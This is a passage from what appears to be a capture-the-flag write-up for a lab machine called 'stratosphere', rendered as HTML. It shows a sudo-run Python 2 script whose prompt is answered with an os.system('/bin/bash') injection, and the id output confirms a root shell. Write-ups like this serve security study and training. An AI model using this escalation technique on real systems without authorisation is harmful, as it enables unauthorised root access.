<p>Let‚Äôs get that root shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>richard@stratosphere:~<span class="nv">$ </span><span class="nb">sudo</span>  /usr/bin/python2 /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
__import__<span class="o">(</span><span class="s2">"os"</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
root@stratosphere:/home/richard# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
:ET